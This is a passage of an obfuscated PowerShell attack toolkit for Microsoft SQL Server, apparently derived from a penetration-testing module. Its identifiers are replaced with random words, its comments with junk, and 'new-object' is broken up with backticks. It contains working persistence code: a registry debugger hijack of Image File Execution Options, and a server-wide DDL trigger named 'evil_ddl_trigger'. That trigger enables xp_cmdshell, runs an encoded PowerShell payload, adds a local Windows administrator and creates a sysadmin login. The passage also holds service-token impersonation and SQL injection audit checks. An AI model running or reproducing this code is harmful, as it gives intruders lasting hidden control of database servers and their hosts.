        $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($FirstStage)
        {
            $PlantsPlants = $FirstStage.Split('.')[0]
        }

        # Microsoft".
        if($LovingDry -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{

            Write-Verbose "$Instance : Attempting to write debugger: $FileName"
            Write-Verbose "$Instance : Attempting to write command: $SoakSame"
        }

        # Microsoft".
        $BoringLarge = "
       --- This will create a registry key through SQL Server (as sysadmin)
        -- to run a defined debugger (any command) instead of intended command
        -- in the example utilman.exe can be replace with cmd.exe and executed on demand via rdp
        --- note: this could easily be a empire/other payload
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name  = 'Debugger',
        @type        = 'REG_SZ',
        @value       = '$SoakSame'"

        # Microsoft".
        $FlyCruel = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        
        # Microsoft".
        $RifleMixed = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name		= N'Debugger',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"

        # Microsoft".
        $DeepAction = Get-SQLQuery -Instance $Instance -BoringLarge $RifleMixed -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill  
        $ScoldAnger = $DeepAction.CheckValue   
        if($ScoldAnger.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }

    End
    {
        # Microsoft".
        Write-Verbose "$Instance : Done."
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLPersistTriggerDDL
{

  [CmdletBinding()]
  Param(
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Username to authenticate with.')]
    [string]$AnimalWeary,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Password to authenticate with.')]
    [string]$EasyAlert,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new SQL Server sysadmin login.')]
    [string]$PriceySteep,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new SQL Server sysadmin login.')]
    [string]$MistyGreedy,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new Windows local administrator account.')]
    [string]$GrateChurch,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new Windows local administrator account.')]
    [string]$EffectDoubt,

    [Parameter(Mandatory=$false,
    HelpMessage='Create trigger that will run the provide PowerShell command.')]
    [string]$HillClose,

    [Parameter(Mandatory = $false,
    ValueFromPipelineByPropertyName = $true,
    HelpMessage = 'SQL Server instance to connection to.')]
    [string]$Instance,

    [Parameter(Mandatory=$false,
    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
    [Switch]$ScrewRemind
  )

    # Microsoft".
    # Microsoft".
    # Microsoft".
    
    # Microsoft".
    $WailMouth = ne`w`-ob`je`ct System.Data.SqlClient.SqlConnection
    
    # Microsoft".
    if($AnimalWeary){
    
        # Microsoft".
        Write-Verbose "$Instance : Attempting to authenticate to $Instance with SQL login $AnimalWeary..."
        $WailMouth.ConnectionString = "Server=$Instance;Database=master;User ID=$AnimalWeary;Password=$EasyAlert;"
        [string]$HoleSomber = $AnimalWeary
    }else{
            
        # Microsoft".
        Write-Verbose "$Instance : Attempting to authenticate to $Instance as the current Windows user..."
        $WailMouth.ConnectionString = "Server=$Instance;Database=master;Integrated Security=SSPI;"   
        $BooksStrong = [Environment]::UserDomainName
        $LandPlacid = [Environment]::UserName
        $HoleSomber = "$BooksStrong\$LandPlacid"                    
     }


    # Microsoft".
    # Microsoft".
    # Microsoft".

    try{
        $WailMouth.Open()
        Write-Verbose "$Instance : Connected." 
        $WailMouth.Close()
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Verbose "$Instance : Connection failed" 
        Write-Verbose "$Instance : Error: $ErrorMessage"  
        Break
    }


    # Microsoft".
    # Microsoft".
    # Microsoft".

    # Microsoft".
    $WailMouth.Open()

    # Microsoft".
    $BoringLarge = "select is_srvrolemember('sysadmin') as sysstatus"

    # Microsoft".
    $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
    $FlyCruel = $FastenWhite.ExecuteReader() 

    # Microsoft".
    $StoryBall = ne`w`-ob`je`ct System.Data.DataTable
    $StoryBall.Load($FlyCruel)  

    # Microsoft".
    $StoryBall | Select-Object -First 1 sysstatus | foreach {

        $AheadGlass = $_.sysstatus
        if ($AheadGlass -ne 0){
            Write-Verbose "$Instance : Confirmed Sysadmin access."                             
        }else{
            Write-Verbose "$Instance : The current user does not have sysadmin privileges." 
            Write-Verbose "$Instance : Sysadmin privileges are required." 
            Break
        }
    }

    # Microsoft".
    $WailMouth.Close()

    # Microsoft".
    # Microsoft".
    # Microsoft".
    
    # Microsoft".
    Write-Verbose "$Instance : Enabling 'Show Advanced Options', if required..."
    
    # Microsoft".
    $WailMouth.Open()

    # Microsoft".
    $BoringLarge = "IF (select value_in_use from sys.configurations where name = 'Show Advanced Options') = 0
    EXEC ('sp_configure ''Show Advanced Options'',1;RECONFIGURE')"

    # Microsoft".
    $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
    $FlyCruel = $FastenWhite.ExecuteReader() 
        
    # Microsoft".
    $WailMouth.Close()    
    

    # Microsoft".
    # Microsoft".
    # Microsoft".

    Write-Verbose "$Instance : Enabling 'xp_cmdshell', if required..."  
    
    # Microsoft".
    $WailMouth.Open()

    # Microsoft".
    $BoringLarge = "IF (select value_in_use from sys.configurations where name = 'xp_cmdshell') = 0
    EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE')"

    # Microsoft".
    $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
    $FlyCruel = $FastenWhite.ExecuteReader() 
        
    # Microsoft".
    $WailMouth.Close()  


    # Microsoft".
    # Microsoft".
    # Microsoft".
    
    Write-Verbose "$Instance : Checking if service account is a local administrator..."  

    # Microsoft".
    $WailMouth.Open()

    # Microsoft".
    $BoringLarge = @"

                        -- Setup reg path 
                        DECLARE @SQLServerInstance varchar(250)  
                        if @@SERVICENAME = 'MSSQLSERVER'
                        BEGIN											
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                        END						
                        ELSE
                        BEGIN
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
                        END

                        -- Grab service account from service's reg path
                        DECLARE @ServiceaccountName varchar(250)  
                        EXECUTE master.dbo.xp_instance_regread  
                        N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
                        N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' 

                        DECLARE @MachineType  SYSNAME
                        EXECUTE master.dbo.xp_regread
                        @rootkey      = N'HKEY_LOCAL_MACHINE',
                        @key          = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                        @value_name   = N'ProductType', 
                        @value        = @MachineType output
                        
                        -- Grab more info about the server
                        SELECT @ServiceAccountName as SvcAcct
"@

    # Microsoft".
    $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
    $FlyCruel = $FastenWhite.ExecuteReader() 

    # Microsoft".
    $DoctorFalse = ne`w`-ob`je`ct System.Data.DataTable
    $DoctorFalse.Load($FlyCruel)  
    $TreeUnpack = $DoctorFalse | select SvcAcct -ExpandProperty SvcAcct 
    $SlipRipe = $TreeUnpack -replace '\.\\',''
        
    # Microsoft".
    $WailMouth.Close() 

    # Microsoft".
    $WailMouth.Open()

    # Microsoft".
    $BoringLarge = "EXEC master..xp_cmdshell 'net localgroup Administrators';"

    # Microsoft".
    $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
    $FlyCruel = $FastenWhite.ExecuteReader() 

    # Microsoft".
    $LevelStreet = ne`w`-ob`je`ct System.Data.DataTable
    $LevelStreet.Load($FlyCruel)  
        
    # Microsoft".
    $WailMouth.Close()  

    if($SlipRipe -eq "LocalSystem" -or $LevelStreet -contains "$SlipRipe"){
        Write-Verbose "$Instance : The service account $SlipRipe has local administrator privileges."  
        $LeanPick = 1
    }else{
        Write-Verbose "$Instance : The service account $SlipRipe does NOT have local administrator privileges." 
        $LeanPick = 0 
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".
    $TrampHard = ""
     if($HillClose){

        # Microsoft".
        Write-Verbose "$Instance : Creating encoding PowerShell payload..." 
        
        # Microsoft".
        if($LeanPick -eq 0){
            Write-Verbose "$Instance : Note: PowerShell won't be able to take administrative actions due to the service account configuration." 
        }

        # Microsoft".
        # Microsoft".

        # Microsoft".
        $SettleDeep = [Text.Encoding]::Unicode.GetBytes($HillClose)
        $AskAwake = [Convert]::ToBase64String($SettleDeep)

        # Microsoft".
        If ($AskAwake.Length -gt 8100)
        {
            Write-Verbose "PowerShell encoded payload is too long so the PowerShell command will not be added." 
        }else{

            # Microsoft".
            $TrampHard = "EXEC master..xp_cmdshell ''PowerShell -enc $AskAwake'';" 

            Write-Verbose "$Instance : Payload generated." 
        }
    }else{
        Write-Verbose "$Instance : Note: No PowerShell will be executed, because the parameters weren't provided." 
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".
    $TrustPaddle = ""
    if($GrateChurch){

        # Microsoft".
        Write-Verbose "$Instance : Creating payload to add OS user..." 

        # Microsoft".
        if($LeanPick -eq 0){

            # Microsoft".
            Write-Verbose "$Instance : The service account does not have local administrator privileges so no OS admin can be created.  Aborted."
            Break
        }else{

            # Microsoft".
            $TrustPaddle = "EXEC master..xp_cmdshell ''net user $GrateChurch $EffectDoubt /add & net localgroup administrators /add $GrateChurch'';"

            # Microsoft".
            Write-Verbose "$Instance : Payload generated." 
        }
    }else{
        Write-Verbose "$Instance : Note: No OS admin will be created, because the parameters weren't provided." 
    }
    
    # Microsoft".
    # Microsoft".
    # Microsoft".
    $SoupReason = ""
    if($PriceySteep){

        # Microsoft".
        Write-Verbose "$Instance : Generating payload to add sysadmin..." 
        
        # Microsoft".
        $SoupReason = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''$PriceySteep'')
        exec(''CREATE LOGIN $PriceySteep WITH PASSWORD = ''''$MistyGreedy'''';EXEC sp_addsrvrolemember ''''$PriceySteep'''', ''''sysadmin'''';'')"

        # Microsoft".
        Write-Verbose "$Instance : Payload generated." 
    }else{
        Write-Verbose "$Instance : Note: No sysadmin will be created, because the parameters weren't provided." 
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".
    if(($PriceySteep) -or ($GrateChurch) -or ($HillClose)){
        # Microsoft".
        Write-Verbose "$Instance : Creating trigger..." 

        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $WailMouth.Open()

        # Microsoft".
        $BoringLarge = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
        exec('CREATE Trigger [evil_ddl_trigger] 
        on ALL Server
        For DDL_SERVER_LEVEL_EVENTS
        AS
        $TrustPaddle $SoupReason $TrampHard')"

        $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
        $FlyCruel = $FastenWhite.ExecuteReader() 
        
        # Microsoft".
        $WailMouth.Close()

         Write-Verbose "$Instance : The evil_ddl_trigger trigger has been added. It will run with any DDL event." 
    }else{
        Write-Verbose "$Instance : No options were provided." 
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".
    if($ScrewRemind){

        # Microsoft".
        Write-Verbose "$Instance : Removing trigger named evil_DDL_trigger..." 

        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $WailMouth.Open()

        # Microsoft".
        $BoringLarge = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER"

        $FastenWhite = ne`w`-ob`je`ct System.Data.SqlClient.SqlCommand($BoringLarge,$WailMouth)
        $FlyCruel = $FastenWhite.ExecuteReader() 
        
        # Microsoft".
        $WailMouth.Close()

        Write-Verbose "$Instance : The evil_ddl_trigger trigger has been been removed." 
    }

    Write-Verbose "$Instance : All done."
}
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditTemplate
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = ''
        $EyesSmile   = ''
        $BeliefNote   = ''
        $ScorchEarth      = ''
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "[CurrentCommand] -Instance $Instance -RotLethal"
        $GlowHorses       = ''
        $KittyPolite     = ''
        $CheeseFood        = 'First Last (Twitter), Company Year'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLImpersonateService
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'This can be used to revert to the original Windows user context.')]
        [switch]$ColourSwanky,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
    }

    Process
    {
        
        # Microsoft".
        if($ColourSwanky){          
            Invoke-TokenManipulation -BedAhead | Out-Null
            Return
        }

        # Microsoft".
        if(-not $Instance){
            Write-Verbose "$Instance : No instance provided."
            Return
        }

        # Microsoft".
        $PinchRotten = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

        # Microsoft".
        $JumpySoothe = Get-SQLLocalAdminCheck
                
        # Microsoft".
        if($JumpySoothe -ne $true){
            write-verbose  "$Instance : $PinchRotten DOES NOT have local admin privileges."
            return
        }else{
            write-verbose  "$Instance : $PinchRotten has local admin privileges."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
        [int]$ThrillAllow = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
        [string]$SmoggyLate = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
        # Microsoft".
        if ($ThrillAllow -eq 0){
            Write-Verbose -Message "$Instance : No process running for provided instance..."
            return
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : - Process ID: $ThrillAllow"
        Write-Verbose -Message "$Instance : - ServiceAccount: $SmoggyLate" 
                
        # Microsoft".
        try{
            Get-Process | Where-Object {$_.id -like $ThrillAllow} | Invoke-TokenManipulation -Instance $Instance -ClamAwake -ErrorAction Continue | Out-Null               
        }catch{
            $ErrorMessage = $_.Exception.Message
            Write-Verbose -Message "$Instance : Impersonation failed."
            Write-Verbose  -Message " $Instance : $ErrorMessage"
            return
        }  
        
        Write-Verbose  -Message "$Instance : Done."                    
    }

    End
    {
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditSQLiSpExecuteAs
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER."
            Return
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Potential SQL Injection - EXECUTE AS OWNER'
        $EyesSmile   = 'The affected procedure is using dynamic SQL and the "EXECUTE AS OWNER" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.'
        $BeliefNote   = 'Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
        $ScorchEarth      = 'High'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -UnusedStew `"EXECUTE AS OWNER`"'"
        $GlowHorses       = ''
        $KittyPolite     = 'https://blog.netspi.com/hacking-EqualMen-WireStain-stored-procedures-part-3-sqli-and-user-impersonation'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
                
        # Microsoft".
        $RiddleTeeth = Get-SQLStoredProcedureSQLi -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -UnusedStew "EXECUTE AS OWNER" 
        
        # Microsoft".
        if($RiddleTeeth.rows.count -ge 1){
            
            # Microsoft".
            $CurveUseful = "Yes"
            $PourSkip = "Unknown"

            # Microsoft".
            $RiddleTeeth |
            ForEach-Object{
            
                # Microsoft".
                $AjarInnate = $_.DatabaseName 
                $BrakeFlavor = $_.SchemaName
                $PageMarch = $_.ProcedureName
                $ObjectName = "$AjarInnate.$BrakeFlavor.$PageMarch"
                $GlowHorses =  "The $ObjectName stored procedure is affected."
                
                # Microsoft".
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)        
            }
        }    

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditSQLiSpSigned
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login."
            Return
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Potential SQL Injection - Signed by Certificate Login'
        $EyesSmile   = 'The affected procedure is using dynamic SQL and has been signed by a certificate login.  As a result, it may be possible to impersonate signer if SQL injection is possible.'
        $BeliefNote   = 'Consider using parameterized queries instead of concatenated strings.'
        $ScorchEarth      = 'High'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -FireSeed"
        $GlowHorses       = ''
        $KittyPolite     = 'https://blog.netspi.com/hacking-EqualMen-WireStain-stored-procedures-part-3-sqli-and-user-impersonation'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
                
        # Microsoft".
        $RiddleTeeth = Get-SQLStoredProcedureSQLi -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -OnlySig
        
        # Microsoft".
        if($RiddleTeeth.rows.count -ge 1){
            
            # Microsoft".
            $CurveUseful = "Yes"
            $PourSkip = "Unknown"

            # Microsoft".
            $RiddleTeeth |
            ForEach-Object{
            
                # Microsoft".
                $AjarInnate = $_.DatabaseName 
                $BrakeFlavor = $_.SchemaName
                $PageMarch = $_.ProcedureName
                $ObjectName = "$AjarInnate.$BrakeFlavor.$PageMarch"
                $GlowHorses =  "The $ObjectName stored procedure is affected."
                
                # Microsoft".
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)        
            }
        }    

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"
